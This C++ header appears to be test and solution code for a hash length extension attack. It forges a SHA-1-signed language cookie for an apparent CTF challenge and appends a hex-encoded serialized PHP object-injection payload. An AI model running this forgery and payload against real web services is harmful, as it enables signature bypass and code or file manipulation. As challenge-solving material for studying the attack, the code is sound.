#pragma once

#include "..\Hash\HashLengthExtension.h"



#define Bytes vector<uint8_t>

Bytes toBytes(string a) {

	Bytes v;

	for (auto c : a)
		v.push_back(c);

	return v;
}



void test_addHashLengthSHA256() {

	using namespace HashLengthExtension;

	vector<uint8_t> initialData = { 'M', 'o', 'n', ' ', 's', 'e', 'c', 'r', 'e', 't' };

	vector<uint8_t> initialHash = SHA256::SHA_256(initialData);


	vector<uint8_t> injectedData = { 'a', 'z', 'e', 'r', 't', 'y' };


	int initialDataSize = initialData.size();
	int injectedDataSize = injectedData.size();


	cout << "SHA-256(data)" << endl;
	cout << hex(initialHash) << endl;



	SHA256::complete(initialData);
	cout << "Initial data with padding: " << endl;
	cout << hex(initialData) << endl;

	cout << "Injected data" << endl;
	cout << hex(injectedData) << endl;

	cout << "Initial size with padding" << endl;
	cout << initialData.size() << endl;



	vector<uint8_t> newHash = addHashLength(initialHash, initialDataSize, injectedData);

	cout << "New hash" << endl;
	cout << hex(newHash) << endl;

}




//Taille du secret : 10 !

//Pour l'épreuve de newbie contest
void getHash() {

	using namespace HashLengthExtension_SHA1;

	int startSize = 26;
	int n = 20;				// Taille max du secret

							//cookie de langue
	Bytes initialCookie = toBytes("a:1:{s:4:\"LANG\";s:2:\"FR\";}");

	//signature du cookie de langue
	Bytes initialHash = fromHex("00bdac1c75e17093c0b554b477ea3ddc7e561942");



	Bytes payload = fromHex("4f3a353a224572726f72223a353a7b733a373a22002a006e616d65223b733a383a224d69737465723746223b733a393a22002a00726561736f6e223b733a31323a2237462069732061206b696e67223b733a31313a22002a007072696f72697479223b693a31303b733a31373a22002a006c6f6767696e674d6574686f6473223b613a323a7b693a303b613a323a7b693a303b733a31303a2276616c69646174696f6e223b693a313b733a303a22223b7d693a313b613a323a7b693a303b733a31373a226c6f675f6572726f725f746f5f66696c65223b693a313b733a383a226c6f67732e747874223b7d7d733a393a22002a006c6f67676564223b623a303b7d");
	payload.insert(payload.begin(), '\n');

	for (int i = 0; i < n; i++) {

		cout << "______________________________________________" << endl;
		cout << "SUPOSED SIZE: " << (i + startSize) << "\t\tSecret size: " << i << endl;

		Bytes temp = initialCookie;
		SHA1::complete(temp);
		temp.erase(temp.begin(), temp.begin() + i);

		cout << "New forged cookie (ignore 0 at the begin)" << endl;
		cout << hex(temp) << hex(payload) << endl;


		cout << "HASH" << endl;
		cout << hex(addHashLength(initialHash, i + startSize, payload)) << endl;


		cout << "______________________________________________" << endl << endl;

		initialCookie.insert(initialCookie.begin(), 0);			//Simule la place qu'occuperai le "secret"
	}






}

